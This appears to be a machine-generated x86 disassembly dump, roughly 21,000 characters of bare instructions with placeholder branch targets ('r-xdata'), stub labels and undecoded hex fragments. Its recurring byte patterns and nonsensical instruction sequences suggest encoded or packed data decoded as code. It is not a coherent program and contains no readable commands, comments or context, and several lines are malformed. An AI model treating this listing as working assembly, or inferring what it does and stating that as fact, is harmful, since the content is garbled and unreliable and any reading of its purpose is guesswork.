sub [ edi + 0x7cd585a5 ] 0x6a6a6466
add eax 0x5050505
add eax 0x9a6a1005
adc [ esi + 0x106a6a7c ] edi
dec esi
0x6a7cb611 0x166a
xchg ebp eax
push 0x7c
inc esi
push 0x847c6a6a
dec ebx
push 0x6a
add eax 0x5050505

mov [ ebp + 0x119a0595 ] ss
xor al 0x74
push 0x6a
jl r-xdata
xchg ebp eax
sbb al 0xe8
and edi edi
fmul st2
sbb al 0xe8
sub eax 0x1cf36f1e
call 0xffffffffcb29ea63
jl r-xdata
insd
push 0x6a
add eax 0x5050505
push 0x2
adc eax 0x7c959595
inc edx
mov ebx 0x7cc39595
mov [ ebp + 0x6a ] ch
push 0x5
sub_48eb7b
push 0xffffffc2
fst [ eax ]
push ebp
jl r-xdata
push 0x6a
jl r-xdata
mov eax [ 0x5059595 ]
add eax 0xe16a95ff
mov cl 0x81
push 0xffffffa3
jl r-xdata
xchg ebp eax
sbb al 0xe8
and edi edi
fmul st2
sbb al 0xe8
sub eax 0x1cf36f1e
call 0xffffffffcb29ea63
jl r-xdata
insd
push 0x6a
add eax 0x5050505
push 0x2
adc eax 0x7c959595
inc edx
mov ebx 0x7cc39595
mov [ ebp + 0x6a ] ch
push 0x5
add eax 0x71d01805
lds ebx [ esi ]
mov esi 0x5059595
add eax 0xf17c91ff
dec edx
push 0x6a
add eax 0x6aa60505
retn 0xc77c
push 0x7c
inc esi
push 0x847c6a6a
dec ebx
push 0x6a
add eax 0x5050505

mov [ ebp + 0x119a0595 ] ss
xor al 0x74
retn
dec eax
push 0x6a
jl r-xdata
test eax 0x76a87c96
bound ebp [ edx + 0x6a ]
add eax 0x451e0505
sbb al 0xc0
dec edi
iretd
dec esi
jl r-xdata
push [ ebp - 0x6a42ea84 ]
xchg ebp eax
add eax 0xc545d018
push ds
rcr [ ebp + 0x6a78367c ] 0x1
push 0x5
add eax 0xd0180505
jno r-xdata
xor eax 0xc56a6a68
push 0x6a
add eax 0x9589857c
xchg ebp eax
sbb al 0xd0
jno r-xdata
push 0x6a
add eax 0x5050505
push 0xffffffc3
popfd
0xf3b9d622 0x5510
0x6a724f11 0xf36a
push ss
out dx al
rcl [ ebp + 0x7c96a918 ] cl
test al 0x76
push ebp
rcr [ ebp + 0x6dd81cf3 ] 0x1
jge r-xdata
push ds
sub_48eba7
push 0x6a
sub edi [ ecx - 0x596a6a69 ]
xor eax 0xc56a6a68
push 0x6a
add eax 0x5050505
push 0xffffffc3
popfd
0xf3b9d622 0x5510
dec esi
jl r-xdata
push [ ebp - 0x6a42ea84 ]
xchg ebp eax
add eax 0xc545d018
push ds
rcr [ ebp + 0x6a78367c ] 0x1
push 0x5
add eax 0xd0180505
jno r-xdata
0x6a724f11 0xf36a
push ss
out dx al
rcl [ ebp + 0x7c96a918 ] cl
test al 0x76
push ebp
push ds
rcr [ ebp + 0x6dd81cf3 ] 0x1
jge r-xdata
retn
dec eax
push 0x6a
jl r-xdata
push 0x6a
add eax 0x9589857c
xchg ebp eax
sbb al 0xd0
jno r-xdata
test eax 0x76a87c96
bound ebp [ edx + 0x6a ]
add eax 0x451e0505
sbb al 0xc0
dec edi
iretd
sub_48ec40
push 0x5
add eax 0x5565c05
jl r-xdata
add eax 0x959de816
0x95b0d811 0x1895
adc [ ebp + 0x6e ] ah
jpe r-xdata
pop esp
push esi
add eax 0x6a7a657c
jl r-xdata
push 0x6a
jge r-xdata
fdiv [ eax + 0x10189595 ]
outsb
push 0x5
add eax 0x62050505
dec ebp
jl r-xdata
push ss
scasd [ edi ]
xchg ebp eax
jl r-xdata
mov esp 0x5059595
add eax 0x16050505
push ebp
popfd
lds edi [ esi + ecx * 8 - 0x68 ]
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0xed139a05
cwde
xchg ebp eax
jo r-xdata
push 0x7c
dec ecx
mov dh 0x95
xchg ebp eax
sbb al 0xd3
jmp 0xffffffff95edd54c
jge r-xdata
mov ch 0x95
xchg ebp eax
add eax 0x7c941ef1
push ds
mov ss [ ebp - 0x71c3826b ]
xchg ebp eax
xchg ebp eax
push ss
push ecx
cdq
cmc
cwde
xchg ebp eax
xchg ebp eax
add eax 0xc81cf305
jno r-xdata
xchg [ ebp + 0x69ff7d95 ] dl
push 0x6a
adc [ ebp + 0x7c ] dl
xchg ebp eax
xchg ebp eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x7fd01cf3
int 0xff
loope r-xdata
retn
dec eax
push 0x6a
jl r-xdata
xchg ebp eax
jl r-xdata
sbb al 0xc0
xlat
push ds
dec esp
iretd
add eax 0x5050505
sbb al 0xd0
sbb al 0xd0
jns r-xdata
test eax 0x76a87c96
bound ebp [ edx + 0x6a ]
add eax 0x451e0505
sbb al 0xc0
dec edi
iretd
add eax 0xa87d0505
push 0x6a
sbb al 0x13
and [ ebp + 0x51169595 ] edx
lodsd [ esi ]
sbb al dl
jns r-xdata
jmp ecx
fnstenv [ esi + 0x5059595 ]
add eax 0xba607c05
xchg ebp eax
xchg ecx eax
mov al [ 0x5059595 ]
mov esi 0x9f007c54
xchg ebp eax
xchg ebp eax
add eax 0x907d5d1e
dec ebx
push 0x6a
jl r-xdata
dec esi
jl r-xdata
push [ ebp - 0x6a42ea84 ]
xchg ebp eax
add eax 0xc545d018
push ds
rcr [ ebp + 0x6a78367c ] 0x1
push 0x5
add eax 0xd0180505
jno r-xdata
cmpsb [ esi ] [ edi ]
push 0xffffffd2
adc [ ebp - 0x66 ] dl
adc ch dh
push edx
sar [ ecx - 0x1a ] 0x1
std
add eax 0x66aef305
jl r-xdata
cmpsb [ esi ] [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x5050505
add eax 0xd1180505
mov cl 0xd9
jl r-xdata
fild [ esi + 0x5059595 ]
add eax 0x5050505

jno r-xdata
xor eax 0xc56a6a68
push 0x6a
add eax 0x9589857c
xchg ebp eax
sbb al 0xd0
jno r-xdata
push 0x6a
add eax 0x5050505
push 0xffffffc3
popfd
0xf3b9d622 0x5510
0x6a724f11 0xf36a
push ss
out dx al
rcl [ ebp + 0x7c96a918 ] cl
test al 0x76
push ebp
push ds
rcr [ ebp + 0x6dd81cf3 ] 0x1
xchg edi eax
jl r-xdata
jle r-xdata
jl r-xdata
0x5059595 0x791e
jl r-xdata
xchg ebp eax
sbb bh cl
add eax 0x95ba607c
push 0x5
add eax 0x5050505
add eax 0x9529136a
xchg ebp eax
xchg ebp eax
jl r-xdata
sar [ eax + edi + 0x76 ] cl
mov al 0x95
xchg ebp eax
sbb al 0xe8
push ecx
jl r-xdata
xchg ebp eax
jl r-xdata
push 0x5
add eax 0xffcf0505
mov ch 0xf3
sbb al 0xd8
pop ebp
sbb al 0xd8
jns r-xdata
inc ebp
push ss
outsb
pushfd
jl r-xdata
mov edx 0xcf189595
dec ecx
int 0xff
push 0x6a
vshufpd ymm7 ymm7 [ ecx + ebp + 0x7c ] 0x6a
push 0x5
add eax 0x7c651e05
add al [ ebp + 0x5059595 ]
add eax 0x5050505
[ edi ]
jl r-xdata
push 0x6a
add eax 0x1cf355a6
ror [ ebp - 0x33 ] 0x1
mov bl 0x95
xchg ebp eax
add eax 0x5050505
jge r-xdata
sbb al 0xe8
jg r-xdata
push ebp
add eax 0x5050505
add eax 0x7c66aef3
and al 0x7e
push 0x6a
add eax 0xcf050505
push [ ebp + 0x7dd81cf3 ]
int3
push 0x6a
add eax 0xf3050505
sbb al 0xd0
in eax 0x18
push 0x2
jge r-xdata
mov dh 0x95
xchg ebp eax
add eax 0x957d026a
push ds
jns r-xdata
mov eax [ 0xffffffffa37c9595 ]
mov al 0x95
xchg ebp eax
movsb [ edi ] [ esi ]
outsb
push 0x6a
0x54168422 0x7c97
das
jg r-xdata
sahf
xchg ebp eax
xchg ebp eax
add eax 0x5050505
push ds
insd
adc [ edx + 0x7c ] ch
dec edx
ja r-xdata
add eax 0x958ffd7d
xchg ebp eax
push 0xffffffe0
cdq
jl r-xdata
leave
jl r-xdata
xor [ edx + 0x6a ] bh
push 0x7c
push edx
jbe r-xdata
fdivr [ ebp - 0x34 ]
xchg ebp eax
xchg ebp eax
jl r-xdata
jpe r-xdata
popad
push 0x6a
add eax 0x5050505
jge r-xdata
push 0x6a
add eax 0x1ec00505
jns r-xdata
mov [ 0xffffffffc56a6a66 ] eax
push edi
mov ch 0xf3
sbb al 0x81
in al 0xd3
jl r-xdata
sbb al dl
cmp [ esp + ecx - 0x6d ] 0x5059595
add eax 0x9a8c6a16
adc dl [ esi + 0x16959595 ]
adc [ ebp + 0x7c55a695 ] 0x9595bdc9
jge r-xdata
jge r-xdata
push 0x5
add eax 0x558e0505
jl r-xdata
fsubr [ 0x6a7a637c ]
push 0x5
cmpsb [ esi ] [ edi ]
push ebp
sbb al 0xd0
dec ebp
int 0xff
clc
sbb al 0xd0
ja r-xdata
mov [ ebp + 0x5050595 ] edx
add eax 0x1e050505
push 0xffffffa6
arpl [ esi + 0x68067c56 ] bp
jge r-xdata
jpe r-xdata
push 0x6a
add eax 0x5050505
sbb al 0xc8
jne r-xdata
push 0x5
add eax 0x791ec005
jl r-xdata
shl [ ecx + 0x1c6de06a ] cl
rol [ ebp + 0x7c ] 0x1
0x5959592 0x7cc6
popfd
mov esi 0x7c851f5d
in eax 0x83
xchg ebp eax
xchg ebp eax
add eax 0xc64ea605
push 0x3
adc eax 0x7c959595
sub [ ebp + 0x6a ] 0x6a
add eax 0x1cf3e6ff
shl [ edi - 0x33 ] 0x1
push [ edi + 0x6a69257c ]
push 0x5
add eax 0x1d65d01d
shl [ ebp + 0x18 ] 0x1
fdiv [ ecx + 0x7c ]
push 0xfffffffd
jl r-xdata
rol [ ecx - 0x6a6cf384 ] 0x1
xchg ebp eax
add eax 0x6a160505
mov [ edx - 0x6a6a69ee ] ds
xchg ebp eax
push ss
xchg [ ebp - 0x65a9516b ] dl
in eax 0xf3
sbb al 0xd0
dec ebx
int 0xff
mov ebx 0x75d01cf3
jl r-xdata
mov dh 0x95
xchg ebp eax
add eax 0x7c050505
pushad
push 0x18
add eax 0xe06a0505
popad
jge r-xdata
jmp [ ebx + 0x7de81cf3 ]
sbb al 0xd0
inc ebp
jl r-xdata
lea edx [ ebp - 0x66aee96b ]
retn
cdq
push 0x5
0x95b01011 0x1e95
fcomp [ ebp - 0x7ae0a242 ]
jl r-xdata
adc ecx edx
jpo r-xdata
mov dl 0x95
xchg ebp eax
push edx
xchg ebp eax
xchg edx eax
xchg ebp eax
xchg esp eax
mov ebp 0x897d9595
test [ ecx + 0x5059595 ] ecx
add eax 0x5050505
push ds
xchg edx eax
xchg ebp eax
xchg ebp eax
add eax 0xb37b7cc6
xchg ebp eax
xchg ebp eax
add eax 0x7dc395ff
jmp r-xdata
mov ecx 0x7fe81cf3
0x657c
adc [ ebp - 0x59fafa6b ] 0x4e
sbb al 0xc0
sub_48f15b
push 0x5
add eax 0x164d1e05
outsb
push 0xffffff9a
adc bl bl
popad
push 0x6a
cmpsb [ esi ] [ edi ]
push ebp
jl r-xdata
xchg ebp eax
jl r-xdata
movsd [ edi ] [ esi ]
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x5050505
jge r-xdata
jl r-xdata
adc [ ebx ] ah
xchg edi eax
xchg ebp eax
xchg ebp eax
jl r-xdata
jno r-xdata
push esi
add eax 0x55100505
0x6a703d11 0x6a6a
push 0x5
add eax 0x61e06a05
sbb al 0xe8
imul edi [ ecx + eax * 2 + 0x75 ] 0x5056a6a
add eax 0x6a49fe7d
push 0xffffffcc
int3
or [ ebp + 0x5ca69595 ] edx
jl r-xdata
xchg edi eax
xchg ebp eax
xchg ebp eax
int 0x7c
jl r-xdata
push 0x7c
shl [ ecx + 0x6a ] 0x1
push 0x5
add eax 0x477cc005
mov cl 0x95
xchg ebp eax
add eax 0x9a109a05
ja r-xdata
xchg ecx eax
xchg ebp eax
xchg ebp eax
add eax 0xfd050505
jl r-xdata
push 0x10
push ebp
0x6a772411 0x7d6a
push [ ebp - 0x4e836a6b ]
ja r-xdata
mov bl 0x95
xchg ebp eax
rcr [ esi ] 0x79
jl r-xdata
mov ss [ ebp + 0x5050595 ]
push ds
pop ebp
sbb al 0xd8
imul esp [ esi - 0x27e30ca4 ] 0xf1ffcc6b
jl r-xdata
int1
push 0x16
0x109a9489 0x4905
jl r-xdata
jpe r-xdata
push 0x6a
add eax 0x5050505
add eax 0xc26a0505
xchg esp eax
xchg ebp eax
xchg ebp eax
xchg ebp eax
xchg ebp eax
adc [ ebp - 0x66 ] dl
adc eax esp
dec ecx
push 0x6a
sbb dl al
xchg ebx eax
sbb [ ecx ] dl
push 0x5
add eax 0x109a0505
and edx [ edi - 0x34836a6b ]
pop ecx
jne r-xdata
popfd
std
sbb al 0xb6
push 0x22
push ecx
xchg ebp eax
xchg ebp eax
xchg ebp eax
jge r-xdata
mov esp 0x7cc59595
pushfd
push 0xffffffd1
mov cl 0x81
push ds
shl [ ecx - 0x6e2d517f ] 0x1
jpe r-xdata
push 0x16
push ecx
lea edx [ eax ]
push ebp
jl r-xdata
int1
push ss
jecxz r-xdata
add eax 0x119a5510
cmp eax 0x6a6a6a70
movsb [ edi ] [ esi ]
xchg ebp eax
xchg ebp eax
sbb al 0x13
popad
xchg ebp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
sar [ edi + edi - 0x6c ] 0x95
push 0x5
add eax 0x49fe7d05
push 0x6a
int3
add eax 0x5050505
xchg esi eax
xchg ebp eax
0x6a628c17 0x7c6a
push esp
xchg ecx eax
push 0x5
add eax 0x99511605
mov cl 0x5
xchg ebp eax
xchg ebp eax
xchg ebp eax
jge r-xdata
jns r-xdata
sbb al 0xd0
pop ebx
jl r-xdata
push 0xffffffcf
jl r-xdata
insd
push 0xffffff9a
adc edx ebp
add eax 0x16f1c26a
push 0x7c
mov ds [ edx + 0x5059595 ]
add eax 0x5050505
add eax 0x5565cce
add eax 0x9a551005
adc [ 0x6a6a6a70 ] edi
sar [ edi - 0x31 ] 0xff
loopne r-xdata
xchg ebx eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
push ds
sub [ esi + 0x179a91d2 ] 0x6a6a628c
jl r-xdata
mov bh 0x95
xchg ebp eax
add eax 0xf3e7ffcf
sbb al 0xc0
jns r-xdata
iretd
jo r-xdata
pop ebp
jl r-xdata
test [ ebp - 0x33ef656b ] edx
0x67be9595 0x229a
lahf
xchg ebp eax
add eax 0xa669e06a
pop esp
push ss
insd
push 0xffffff9a
add [ esp + edi * 2 + 0x53 ] dl
jge r-xdata
xchg ebp eax
0x959acc10 0xbe95
0x6c7c9f22 0x9596
jmp eax
jl r-xdata
mov esi 0x9f229a67
sbb al 0xc0
jpo r-xdata
sub eax 0x56a6a6f
push 0x5
add eax 0x684d101e
push 0x6a
scasb [ edi ]
rcr [ ebp - 0x769aee66 ] 0x1
xchg ebp eax
xchg ebp eax
sbb [ eax ] dl
inc ebp
push 0xde7c6a6a
jbe r-xdata
mov dl [ ebp + 0x5050595 ]
push ds
add [ ecx + 0x68 ] cl
push 0x6a
sbb al 0x1
clc
push ds
inc esp
sbb al 0xc0
add eax 0x65109a05
test [ ebp + 0x6d807c95 ] dl
push 0x6a
sbb al 0xd0
ja r-xdata
call [ ebp + 0x61c27cc5 ]
jl r-xdata
jl r-xdata
xchg edi eax
jne r-xdata
cmpsb [ gs : esi ] [ edi ]
inc edi
jl r-xdata
sbb al 0xc0
push 0x5
add eax 0xfd050505
xchg ebp eax
adc eax 0x95ff9595
push 0xffffffe1
mov cl 0xb5
push 0xffffffc3
loope r-xdata
sbb al 0xc0
jg r-xdata
out 0xf3 eax
mov [ ebp + 0x5050595 ] ss
mov edi 0x7d059595
push cs
ja r-xdata
inc edx
push 0x6a
add eax 0xd31c0505
loope r-xdata
add eax 0x5050505
sbb al 0xd0
push 0x5
add eax 0xa595fd05
xchg ebp eax
xchg ebp eax
push 0xffffffe3
lds edi [ eax + edi + 0x79 ]
push 0x6a
add eax 0xf35ca605
sbb al 0x9d
push esi
push ds
jns r-xdata
popfd
adc eax 0x7c959595
xchg ebp eax
push 0x6a
add eax 0x791e0505
jl r-xdata
xchg ebp eax
xchg ebp eax
add eax 0x1e0505
dec ecx
push 0x11c6a6a
shl [ ecx - 0x4e2ee17f ] 0x1
jl r-xdata
push 0x1e
dec ecx
int 0xff
mov ebx 0x719e7cca
push 0x6a
add eax 0x959d7e7d
xchg ebp eax
int3
test [ eax + 0x5059595 ] edi
add eax 0x5050505
add eax 0xd01cf305
cmp edi [ esp + ebp * 2 + 0x49 ]
push 0x6a
push ds
rcr [ ebp + 0x6a6f2d7c ] 0x1
push 0x5
sbb al 0xd0
jns r-xdata
shr [ ebp - 0x36 ] 0x1
into
jl r-xdata
dec edi
push 0x6a
add eax 0x5050505
add eax 0x97571605
pop ecx
int 0xff
cli
push 0x6a
add eax 0x5050505
add eax 0xd01cf305
[ ebp - 0x9e2fe8 ]
xchg ebp eax
lds edi [ edx + eax * 8 + 0x61 ]
sub_48f45c
push [ ebp + 0x18c3c3c3 ]
adc cl al
outsb
push 0x6a
lds edi [ eax + edi - 0x50 ]
xchg ebp eax
xchg ebp eax
int 0xff
div bl
sbb al 0xd0
dec edi
jl r-xdata
jl r-xdata
jg r-xdata
push 0x5
add eax 0xb5ff0505
jl r-xdata
jle r-xdata
push 0x6a
sbb al dl
dec ecx
lds ebx [ eax ]
rcl [ 0x6a7b707c ] 0x1
push 0x5
push ds
push edx
jge r-xdata
mov cl 0x8d
jge r-xdata
jne r-xdata
push ebp
push 0x16
jmp 0x7cca7a6a
push 0xfffffff3
sbb al 0xe0
std
push ds
loopne r-xdata
arpl [ ebp + 0x6a ] si
lds ebx [ esi ]
push ebx
jl r-xdata
ror [ ecx - 0x3b ] 0x1
sbb al dl
adc eax 0x6a7b707c
insb
push 0x6a
int3
push 0x16
push ecx
lea ebx [ eax ]
shl [ 0xfffffffff11018c5 ] 0x1
push 0x6a
push 0xffffffc5
retn
xchg [ ebp - 0x66aee96b ] dl
sbb al 0xd0
popad
jl r-xdata
int 0xf3
push 0x5
std
xchg ebp eax
xchg ebp eax
xchg ebp eax
popfd
call ebp
sbb al 0xd0
popad
jl r-xdata
xchg ebp eax
xchg ebp eax
jl r-xdata
mov bh 0x95
xchg ebp eax
jl r-xdata
add al [ edi + 0x51169595 ]
mov bl 0x95
xchg ebp eax
add eax 0x7d99c01e
mov ebx 0xc0189595
popad
jge r-xdata
cdq
xchg ebx eax
xchg ebp eax
xchg ebp eax
add eax 0x68ed1018
push 0x6a
jge r-xdata
push ds
shr [ ecx + 0x1e ] 0x1
adc [ ebx ] 0xdd7c4496
mov dl [ ebp + 0x5050595 ]
add eax 0x10050505
push ebp
0x6a4b7c11 0x7c6a
arpl [ edx + 0x6a ] bp
add eax 0x5050505
sbb al 0xd0
int 0xf3
shl [ ecx + 0x7c ] 0x1
jmp 0x7cde8af3
outsd
push 0x6a
add eax 0x5050505
jge r-xdata
jl r-xdata
xchg edi eax
xchg ebp eax
xchg ebp eax
add eax 0xca55a605
pop esp
push esi
add eax 0x5050505
sbb al 0xe8
push ebx
push ds
imul esi ebx 0x1c
call 0x664a7233
push 0x6a
add eax 0x6a050505
retn
adc [ ebp - 0x66 ] dl
adc [ edx - 0x7d ] cl
mov ebx 0xe06a9595
popfd
jl r-xdata
add eax 0x9587027d
jne r-xdata
xchg ebp eax
push ss
push ecx
inc [ ebp - 0x398e2fe8 ]
lds edi [ ebp + 0x1d ]
xchg [ ebp - 0x622fe16b ] edx
push ds
in eax 0xa9
xchg esi eax
0x7c81d322 0x802f
xchg ebp eax
xchg ebp eax
add eax 0x1e99e06a
fcomp [ ebp - 0x6a4ee584 ]
xchg ebp eax
add eax 0x9dd81e05
xchg [ ebp - 0x66aee96b ] edx
add eax 0x6a41c47c
push 0x5
add eax 0x1c79e06a
enter 0xc261 0x7c
xor [ esi + 0x5059595 ] 0x5
add eax 0x5050505
add eax 0xd8119a05
adc [ ebp - 0x6bc7836b ] 0x95
xchg ebp eax
add eax 0x5050505
add eax 0x91ff0505
jl r-xdata
adc [ ebp + 0x5050595 ] 0x5
add eax 0x5050505
xchg esi eax
shr [ ecx + 0x7c ] 0x1
push es
lea edx [ ebp - 0x1eefe76b ]
outsb
push 0x6a
lds ebp [ edx + 0x2 ]
jge r-xdata
pop ebx
push 0x6a
push 0xffffffc3
lodsd [ esi ]
push ds
dec ebp
push ss
outsb
push 0xffffff9a
adc [ esi ] dh
xchg [ ebp + 0x7c55a695 ] dl
dec esp
push 0x5056a6a
add eax 0xa7229a05
jl r-xdata
adc [ ebp - 0x66 ] dl
adc [ ebx + ecx * 2 + 0x6a ] edi
push 0x7c
0x95834a10 0x7c95
push esi
pushad
push 0x6a
add eax 0x5510cc05
push 0x18
lds ebx [ ebx - 0x6a6a6adb ]
adc [ ebp - 0x2b2ee76b ] 0x6b
add eax 0x7ca7229a
inc esp
xchg ebp eax
xchg ebp eax
jl r-xdata
xchg ebp eax
mov [ ebp - 0x300fa6b ] dl
jl r-xdata
jl r-xdata
call [ ecx - 0x6a7f6384 ]
xchg ebp eax
sbb cl dl
aam 0x6b
xchg ebp eax
xchg ebp eax
mov bl 0x7c
adc [ eax + 0x1e6a6a79 ] edi
jl r-xdata
retn 0x959b
imul ebp [ edx + 0x6a ] 0xffffffbe
shl [ ecx + 0x556dd91 ] 0x1
add eax 0xc5050505
sbb [ eax ] bl
and [ ebp + 0x6a ] ebp
push 0x7d
cmp edi [ ebp + 0x16cc9595 ]
insd
xchg esp eax
0x6a42ce11 0x186a
sbb [ ebp + 0x68 ] bl
push 0x6a
jl r-xdata
and [ ebx + 0x6a ] ah
push 0x5
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xd0180505
inc ebp
lds ebp [ edx - 0x20 ]
dec ecx
push 0xffffffe0
jns r-xdata
jpo r-xdata
pushfd
and cl [ ebp - 0x6b ]
xchg ebp eax
xchg ebp eax
scasb [ edi ]
0xffff8a11 0x6a79
push 0x6a
and cl [ ecx - 0x6b ]
fwait
xchg ebp eax
xchg ebp eax
add eax 0x119a0505
mov eax 0x1e6a6a79
dec esi
push 0x6a
add eax 0x5050505
int 0xf3
sbb al 0xd0
imul esp [ esi - 0x62f283ab ] 0x1e059595
push 0x5
add eax 0x5050505
add eax 0x9a050505
adc bl dl
jg r-xdata
jl r-xdata
sub bl [ esi + 0x1ec29595 ]
insd
jl r-xdata
jns r-xdata
or eax 0x595959d
push ds
push 0x7c
add eax 0x5050505
push ss
insd
push 0xffffff9a
add [ esi + ebx + 0x54 ] dl
0xcecb
mov dh 0x95
xchg ebp eax
add eax 0x5566d44
jl r-xdata
mov ecx 0x5059595
add eax 0xb1d15305
adc [ ebp + edi * 2 + 0x6a6a4cf9 ] 0x790b7ccc
push 0x6a
add eax 0x95bdc97c
xchg ebp eax
add eax 0x1c55a605
enter 0x1c75 0xc8
popad
[ edi ]
rcl [ ebx - 0x7b20e966 ] cl
xchg ebp eax
xchg ebp eax
push ds
rol [ ebp + 0x7c ] 0x1
dec edi
mov edi 0x5059595
add eax 0x5050505
add eax 0x4c147c05
push 0x6a
add eax 0x5050505
add eax 0xc4050505
push ss
cdq
cmp [ eax + edx - 0x47 ] 0xffffff95
xchg ebp eax
add eax 0xde7dd052
retn
inc eax
push 0x6a
add eax 0xc5050505
sub_48f4b9
out dx eax
dec edi
push 0x6a
add eax 0xff050505
mov ch 0x7c
fbstp [ ebp + 0x6a ]
push 0x5
std
xchg ebp eax
xchg ebp eax
xchg ebp eax
popfd
call ebp
sbb al 0xd0
popad
jl r-xdata
cdq
xchg ebx eax
xchg ebp eax
xchg ebp eax
add eax 0x68ed1018
push 0x6a
jge r-xdata
jl r-xdata
xchg edi eax
xchg ebp eax
xchg ebp eax
add eax 0xca55a605
pop esp
push esi
add eax 0x5050505
sbb al 0xe8
push ebx
push ds
imul esi ebx 0x1c
call 0x664a7233
push 0x6a
add eax 0x6a050505
retn
add eax 0x9587027d
jne r-xdata
add eax 0x6a41c47c
push 0x5
add eax 0x1c79e06a
enter 0xc261 0x7c
xor [ esi + 0x5059595 ] 0x5
add eax 0x5050505
add eax 0xd8119a05
adc [ ebp - 0x6bc7836b ] 0x95
xchg ebp eax
add eax 0x5050505
add eax 0x91ff0505
jl r-xdata
adc [ ebp + 0x5050595 ] 0x5
add eax 0x5050505
xchg esi eax
shr [ ecx + 0x7c ] 0x1
push es
lea edx [ ebp - 0x1eefe76b ]
outsb
push 0x6a
lds ebp [ edx + 0x2 ]
jge r-xdata
inc [ ebp - 0x398e2fe8 ]
lds edi [ ebp + 0x1d ]
xchg [ ebp - 0x622fe16b ] edx
push ds
in eax 0xa9
xchg esi eax
0x7c81d322 0x802f
xchg ebp eax
xchg ebp eax
add eax 0x1e99e06a
fcomp [ ebp - 0x6a4ee584 ]
xchg ebp eax
add eax 0x9dd81e05
push 0x18
ror [ ecx - 0x3b ] 0x1
sbb al dl
adc eax 0x6a7b707c
push 0xfffffff3
sbb al 0xe0
std
push ds
loopne r-xdata
lds ebx [ ebx - 0x6a6a6adb ]
adc [ ebp - 0x2b2ee76b ] 0x6b
add eax 0x7ca7229a
inc esp
xchg ebp eax
xchg ebp eax
jl r-xdata
arpl [ ebp + 0x6a ] si
lds ebx [ esi ]
push ebx
jl r-xdata
xchg ebp eax
mov [ ebp - 0x300fa6b ] dl
jl r-xdata
jl r-xdata
call [ ecx - 0x6a7f6384 ]
xchg ebp eax
sbb cl dl
aam 0x6b
add al [ edi + 0x51169595 ]
mov bl 0x95
xchg ebp eax
add eax 0x7d99c01e
mov ebx 0xc0189595
popad
jge r-xdata
xchg ebp eax
xchg ebp eax
mov bl 0x7c
adc [ eax + 0x1e6a6a79 ] edi
jl r-xdata
retn 0x959b
imul ebp [ edx + 0x6a ] 0xffffffbe
shl [ ecx + 0x556dd91 ] 0x1
add eax 0xc5050505
sbb [ eax ] bl
and [ ebp + 0x6a ] ebp
push 0x7d
cmp edi [ ebp + 0x16cc9595 ]
insd
xchg esp eax
0x6a42ce11 0x186a
sbb [ ebp + 0x68 ] bl
push 0x6a
jl r-xdata
adc [ ebp - 0x66 ] dl
adc [ edx - 0x7d ] cl
mov ebx 0xe06a9595
popfd
jl r-xdata
and [ ebx + 0x6a ] ah
push 0x5
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xd0180505
inc ebp
lds ebp [ edx - 0x20 ]
dec ecx
push 0xffffffe0
jns r-xdata
jpo r-xdata
pushfd
and cl [ ebp - 0x6b ]
xchg ebp eax
xchg ebp eax
scasb [ edi ]
0xffff8a11 0x6a79
push 0x6a
and cl [ ecx - 0x6b ]
fwait
xchg ebp eax
xchg ebp eax
add eax 0x119a0505
mov eax 0x1e6a6a79
push ds
shr [ ecx + 0x1e ] 0x1
adc [ ebx ] 0xdd7c4496
mov dl [ ebp + 0x5050595 ]
add eax 0x10050505
push ebp
0x6a4b7c11 0x7c6a
arpl [ edx + 0x6a ] bp
add eax 0x5050505
sbb al 0xd0
int 0xf3
sbb al 0xd0
popad
jl r-xdata
pop ebx
push 0x6a
push 0xffffffc3
lodsd [ esi ]
push ds
dec ebp
push ss
outsb
push 0xffffff9a
adc [ esi ] dh
xchg [ ebp + 0x7c55a695 ] dl
dec esp
push 0x5056a6a
add eax 0xa7229a05
jl r-xdata
adc [ ebp - 0x66 ] dl
adc [ ebx + ecx * 2 + 0x6a ] edi
push 0x7c
pushad
push 0x6a
add eax 0x5510cc05
0x95834a10 0x7c95
push esi
dec esi
push 0x6a
add eax 0x5050505
int 0xf3
sbb al 0xd0
imul esp [ esi - 0x62f283ab ] 0x1e059595
push 0x5
add eax 0x5050505
add eax 0x9a050505
adc bl dl
jg r-xdata
xchg ebp eax
xchg ebp eax
jl r-xdata
mov bh 0x95
xchg ebp eax
jl r-xdata
jl r-xdata
sub bl [ esi + 0x1ec29595 ]
insd
jl r-xdata
jns r-xdata
or eax 0x595959d
push ds
push 0x7c
shl [ ecx + 0x7c ] 0x1
jmp 0x7cde8af3
outsd
push 0x6a
add eax 0x5050505
jge r-xdata
add eax 0x5050505
push ss
insd
push 0xffffff9a
add [ esi + ebx + 0x54 ] dl
0xcecb
mov dh 0x95
xchg ebp eax
add eax 0x5566d44
jl r-xdata
mov ecx 0x5059595
add eax 0xb1d15305
adc [ ebp + edi * 2 + 0x6a6a4cf9 ] 0x790b7ccc
push 0x6a
add eax 0x95bdc97c
xchg ebp eax
add eax 0x1c55a605
enter 0x1c75 0xc8
popad
[ edi ]
rcl [ ebx - 0x7b20e966 ] cl
xchg ebp eax
xchg ebp eax
push ds
rol [ ebp + 0x7c ] 0x1
dec edi
mov edi 0x5059595
add eax 0x5050505
add eax 0x4c147c05
push 0x6a
add eax 0x5050505
add eax 0xc4050505
push ss
xchg ebp eax
push ss
push ecx
xchg [ ebp - 0x66aee96b ] edx
cdq
cmp [ eax + edx - 0x47 ] 0xffffff95
xchg ebp eax
add eax 0xde7dd052
retn
inc eax
push 0x6a
add eax 0xc5050505
sub_48f6f4
arpl [ edx + 0x6a ] bp
add eax 0x83991cf3
jl r-xdata
faddp st3
jl r-xdata
mov ecx 0x52059595
sar [ ebp - 0x22 ] 0x1
pop ebp
push 0xc27c6a6a
fwait
xchg ebp eax
xchg ebp eax
add eax 0x119a0505
mov eax 0x1e6a6a79
jbe r-xdata
and cl [ ebp - 0x6b ]
xchg ebp eax
xchg ebp eax
scasb [ edi ]
0xffff8a11 0x6a79
push 0x6a
and cl [ ecx - 0x6b ]
xchg ebp eax
xchg ebp eax
mov bl 0x7c
adc [ eax + 0x1e6a6a79 ] edi
jl r-xdata
jl r-xdata
push 0x5
add eax 0x5050505
retn
